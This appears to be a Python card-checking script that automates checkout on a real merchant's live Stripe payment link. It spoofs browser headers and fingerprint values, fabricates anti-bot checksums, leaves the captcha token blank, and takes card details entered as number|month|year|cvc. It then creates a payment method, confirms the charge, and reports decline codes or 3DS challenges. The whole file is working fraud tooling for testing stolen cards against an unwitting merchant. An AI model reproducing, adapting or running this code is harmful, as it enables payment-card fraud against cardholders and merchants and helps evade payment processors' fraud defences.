import base64
import json
import random
import re
import string
import urllib.parse
import uuid
from datetime import datetime

import requests

BUY_URL = "https://buy.stripe.com/28o2apdMBcTa69G3cf"
PAYMENT_LINK_ID = BUY_URL.rstrip("/").split("/")[-1]
BILLING_EMAIL = "gfdgdfigjdogj@gmail.com"

USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 Edg/145.0.0.0"

PDF_VIEWERS = "PDF Viewer,internal-pdf-viewer,application/pdf,pdf++text/pdf,pdf, Chrome PDF Viewer,internal-pdf-viewer,application/pdf,pdf++text/pdf,pdf, Chromium PDF Viewer,internal-pdf-viewer,application/pdf,pdf++text/pdf,pdf, Microsoft Edge PDF Viewer,internal-pdf-viewer,application/pdf,pdf++text/pdf,pdf, WebKit built-in PDF,internal-pdf-viewer,application/pdf,pdf++text/pdf,pdf"


def _rand_id(k=32):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=k))


def _rand_hex(k=64):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=k))


def parse_from_buy_page(html):
    key = None
    m = re.search(r"pk_live_[A-Za-z0-9]+", html)
    if m:
        key = m.group(0)
    cs_id = None
    m = re.search(r"cs_live_[A-Za-z0-9]+", html)
    if m:
        cs_id = m.group(0)
    return key, cs_id


def luhn_check_digit(partial):
    s = 0
    for i, c in enumerate(reversed(partial)):
        n = int(c)
        if i % 2 == 0:
            n *= 2
            if n > 9:
                n -= 9
        s += n
    return str((10 - s % 10) % 10)


def parse_card_input(line):
    line = (line or "").strip().replace(" ", "")
    if not line:
        return None
    parts = line.split("|")
    if len(parts) < 4:
        return None
    number = parts[0].strip().replace(" ", "")
    month = parts[1].strip().zfill(2)
    year = parts[2].strip()
    if len(year) == 4:
        year = year[-2:]
    cvc = parts[3].strip()
    name = parts[4].strip() if len(parts) > 4 else "Card Holder"
    if not number or not month or not year or not cvc:
        return None
    return {
        "number": number,
        "cvc": cvc,
        "exp_month": month,
        "exp_year": year,
        "name": name or "Card Holder",
        "email": BILLING_EMAIL,
    }


def get_card():
    try:
        inp = input("Card (number|month|year|cvc): ").strip()
    except EOFError:
        inp = ""
    card = parse_card_input(inp) if inp else None
    if card:
        return card


def encode_payload(payload):
    raw = json.dumps(payload, separators=(",", ":"))
    quoted = urllib.parse.quote(raw, safe="")
    return base64.b64encode(quoted.encode()).decode()


session = requests.Session()
get_headers = {
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "accept-language": "vi,en-US;q=0.9,en;q=0.8",
    "sec-ch-ua": '"Not:A-Brand";v="99", "Microsoft Edge";v="145", "Chromium";v="145"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "none" if not session.cookies else "same-origin",
    "sec-fetch-user": "?1",
    "upgrade-insecure-requests": "1",
    "user-agent": USER_AGENT,
}
resp = session.get(BUY_URL, headers=get_headers)
html = resp.text

stripe_mid = (resp.cookies.get("__stripe_mid") or session.cookies.get("__stripe_mid")) or None
stripe_sid = (resp.cookies.get("__stripe_sid") or session.cookies.get("__stripe_sid")) or None

key_token = None
m = re.search(r'["\']([A-Za-z0-9_-]{40,50})["\']', html)
if m:
    key_token = m.group(1)

merchant_ui_headers = {
    "accept": "application/json",
    "accept-language": "vi,en-US;q=0.9,en;q=0.8",
    "content-type": "application/x-www-form-urlencoded",
    "origin": "https://buy.stripe.com",
    "referer": "https://buy.stripe.com/",
    "sec-ch-ua": '"Not:A-Brand";v="99", "Microsoft Edge";v="145", "Chromium";v="145"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-site",
    "user-agent": USER_AGENT,
}
payment_link_form = {
    "eid": "NA",
    "browser_locale": "vi",
    "browser_timezone": "Asia/Saigon",
    "referrer_origin": "https://karibuwomenhome.com.au",
}
pl_resp = session.post(
    f"https://merchant-ui-api.stripe.com/payment-links/{PAYMENT_LINK_ID}",
    headers=merchant_ui_headers,
    data=urllib.parse.urlencode(payment_link_form),
)
checkout_session_id = None
pl_data = {}
pl_config_id = None
pl_init_checksum = None
pl_expected_amount = None
pl_line_item_id = None
pl_currency = None
pl_rqdata = None
pl_site_key = None
if pl_resp.ok:
    try:
        pl_data = pl_resp.json()
        checkout_session_id = pl_data.get("session_id")
        pl_config_id = pl_data.get("config_id")
        pl_init_checksum = pl_data.get("init_checksum")
        pl_currency = pl_data.get("currency") or "aud"
        pl_rqdata = pl_data.get("rqdata")
        pl_site_key = pl_data.get("site_key")
        lig = pl_data.get("line_item_group") or {}
        pl_expected_amount = lig.get("total") or lig.get("due") or lig.get("subtotal")
        if pl_expected_amount is not None:
            pl_expected_amount = int(pl_expected_amount)
        items = lig.get("line_items") or []
        if items:
            pl_line_item_id = items[0].get("id")
    except Exception:
        pass

pk_live, checkout_session_id_from_html = parse_from_buy_page(html)
if not checkout_session_id:
    checkout_session_id = checkout_session_id_from_html
if not pk_live:
    pk_live = "pk_live_51QRg19RoxmaXTuY55nJGUChdohsr8gq6tGgVsA6viZ9l6h2UJ2UmyaqM4yng0sjiNhPImBr6XS0KXJY6nvYRVxAq00eT8UvNBF"
if not checkout_session_id:
    checkout_session_id = "cs_live_a1r2cbZ7xviYNl1hbdjN4HQNUw6hKvfjKdCpvKR48pVpsxvoFypXlLvkfr"
print("checkout_session_id:", checkout_session_id)

muid = "bf10e066-3dde-43cf-990c-7f526e267148"
guid = "598209cc-46fa-4e08-b69c-22b3316aba05"
sid = "4318288f-e6f2-4e62-bc88-4d5ccc435a1b"


stripe_js_id = str(uuid.uuid4())
currency = pl_currency or "aud"

api_headers = {
    "accept": "application/json",
    "accept-language": "vi,en-US;q=0.9,en;q=0.8",
    "content-type": "application/x-www-form-urlencoded",
    "origin": "https://js.stripe.com",
    "priority": "u=1, i",
    "referer": "https://js.stripe.com/",
    "sec-ch-ua": '"Not:A-Brand";v="99", "Microsoft Edge";v="145", "Chromium";v="145"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-site",
    "user-agent": USER_AGENT,
}

elements_sessions_params = {
    "client_betas[0]": "google_pay_beta_1",
    "client_betas[1]": "disable_deferred_intent_client_validation_beta_1",
    "client_betas[2]": "blocked_card_brands_beta_2",
    "deferred_intent[mode]": "payment",
    "deferred_intent[amount]": str(pl_expected_amount) if pl_expected_amount is not None else "100",
    "deferred_intent[currency]": currency,
    "deferred_intent[payment_method_types][0]": "card",
    "deferred_intent[payment_method_types][1]": "link",
    "deferred_intent[capture_method]": "automatic_async",
    "currency": currency,
    "key": pk_live,
    "elements_init_source": "payment_link",
    "hosted_surface": "checkout",
    "referrer_host": "buy.stripe.com",
    "stripe_js_id": stripe_js_id,
    "locale": "vi",
    "type": "deferred_intent",
    "checkout_session_id": checkout_session_id,
}
response = session.get(
    "https://api.stripe.com/v1/elements/sessions",
    params=elements_sessions_params,
    headers=api_headers,
)
es_data = response.json()
config_id = pl_config_id or es_data.get("config_id")

expected_amount_cents = pl_expected_amount
if expected_amount_cents is None:
    sess = es_data.get("session") or es_data
    expected_amount_cents = sess.get("amount_total") or sess.get("amount_subtotal") or es_data.get("amount") or es_data.get("total")
if expected_amount_cents is None and "displayed_line_item_groups" in es_data and es_data["displayed_line_item_groups"]:
    grp = es_data["displayed_line_item_groups"][0]
    expected_amount_cents = grp.get("subtotal") or grp.get("total")
    if expected_amount_cents is None and grp.get("line_items"):
        total = sum(
            int(li.get("amount") or li.get("unit_amount") or 0)
            for li in grp["line_items"]
        )
        if total:
            expected_amount_cents = total
if expected_amount_cents is None and "line_items" in es_data and es_data["line_items"]:
    expected_amount_cents = sum(
        int(li.get("amount") or li.get("unit_amount") or 0) for li in es_data["line_items"]
    )
if expected_amount_cents is None:
    pp_resp = session.get(
        f"https://api.stripe.com/v1/payment_pages/{checkout_session_id}",
        params={"key": pk_live},
        headers={**api_headers, "origin": "https://buy.stripe.com", "referer": "https://buy.stripe.com/"},
    )
    if pp_resp.ok:
        try:
            pp = pp_resp.json()
            expected_amount_cents = pp.get("amount_total") or pp.get("amount_subtotal") or pp.get("total")
            if expected_amount_cents is not None:
                expected_amount_cents = int(expected_amount_cents)
        except Exception:
            pass
if expected_amount_cents is None:
    expected_amount_cents = 100
expected_amount_cents = int(expected_amount_cents)
expected_amount_str = str(expected_amount_cents)

line_item_id = pl_line_item_id
if not line_item_id and "displayed_line_item_groups" in es_data and es_data["displayed_line_item_groups"]:
    items = es_data["displayed_line_item_groups"][0].get("line_items") or []
    if items:
        line_item_id = items[0].get("id")
if not line_item_id and "line_items" in es_data and es_data["line_items"]:
    line_item_id = es_data["line_items"][0].get("id")
print("config_id:", config_id, "line_item_id:", line_item_id, "expected_amount:", expected_amount_cents)

buy_headers = {**api_headers, "origin": "https://buy.stripe.com", "referer": "https://buy.stripe.com/"}

if line_item_id:
    form_data = {
        "eid": "NA",
        "updated_line_item_amount[line_item_id]": line_item_id,
        "updated_line_item_amount[unit_amount]": str(expected_amount_cents),
        "key": pk_live,
    }
    session.post(
        f"https://api.stripe.com/v1/payment_pages/{checkout_session_id}",
        headers=buy_headers,
        data=urllib.parse.urlencode(form_data),
    )

card = get_card()

form_pm = {
    "type": "card",
    "card[number]": card["number"],
    "card[cvc]": card["cvc"],
    "card[exp_month]": card["exp_month"],
    "card[exp_year]": card["exp_year"],
    "billing_details[name]": card["name"],
    "billing_details[email]": card["email"],
    "billing_details[address][country]": "VN",
    "guid": guid,
    "muid": muid,
    "sid": sid,
    "key": pk_live,
    "payment_user_agent": "stripe.js/148043f9d7; stripe-js-v3/148043f9d7; payment-link; checkout",
    "client_attribution_metadata[client_session_id]": stripe_js_id,
    "client_attribution_metadata[checkout_session_id]": checkout_session_id,
    "client_attribution_metadata[merchant_integration_source]": "checkout",
    "client_attribution_metadata[merchant_integration_version]": "payment_link",
    "client_attribution_metadata[payment_method_selection_flow]": "automatic",
    "client_attribution_metadata[checkout_config_id]": config_id or "",
}
response = session.post(
    "https://api.stripe.com/v1/payment_methods",
    headers=buy_headers,
    data=urllib.parse.urlencode(form_pm),
)
pm_resp = response.json()
pm_id = pm_resp.get("id") if response.ok else None
if pm_resp.get("error"):
    err = pm_resp["error"]
    print("payment_methods error:", response.status_code, err.get("code"), err.get("message"))
if not pm_id:
    print("Không tạo được PaymentMethod")
    exit(1)
print("pm_id:", pm_id)

init_checksum = pl_init_checksum or _rand_id(32)
js_checksum = "".join(random.choices(string.ascii_letters + string.digits + "~^=[]|%#{}<>?`", k=50))
pxvid = str(uuid.uuid4())
rv_timestamp = "".join(random.choices(string.ascii_letters + string.digits + "&%=<>^`[];", k=120))

confirm_form = {
    "eid": "NA",
    "payment_method": pm_id,
    "expected_amount": expected_amount_str,
    "last_displayed_line_item_group_details[subtotal]": expected_amount_str,
    "last_displayed_line_item_group_details[total_exclusive_tax]": "0",
    "last_displayed_line_item_group_details[total_inclusive_tax]": "0",
    "last_displayed_line_item_group_details[total_discount_amount]": "0",
    "last_displayed_line_item_group_details[shipping_rate_amount]": "0",
    "expected_payment_method_type": "card",
    "guid": guid,
    "muid": muid,
    "sid": sid,
    "key": pk_live,
    "version": "148043f9d7",
    "init_checksum": init_checksum,
    "js_checksum": js_checksum,
    "pxvid": pxvid,
    "passive_captcha_token": "",
    "passive_captcha_ekey": pl_site_key or "",
    "rv_timestamp": rv_timestamp,
    "client_attribution_metadata[client_session_id]": stripe_js_id,
    "client_attribution_metadata[checkout_session_id]": checkout_session_id,
    "client_attribution_metadata[merchant_integration_source]": "checkout",
    "client_attribution_metadata[merchant_integration_version]": "payment_link",
    "client_attribution_metadata[payment_method_selection_flow]": "automatic",
    "client_attribution_metadata[checkout_config_id]": config_id or "",
}
response = session.post(
    f"https://api.stripe.com/v1/payment_pages/{checkout_session_id}/confirm",
    headers=buy_headers,
    data=urllib.parse.urlencode(confirm_form, safe=""),
)
data = response.json()
if response.status_code == 200 and isinstance(data.get("id"), str) and data["id"].startswith("ppage_"):
    print("3DS")

err = data.get("error") or {}
if err:
    code = err.get("code")
    decline_code = err.get("decline_code")
    message = err.get("message")
    charge = err.get("charge")
    print("code:", code, "\n" "decline_code:", decline_code, "\n" "message:", message)
    if charge:
        print("charge:", charge)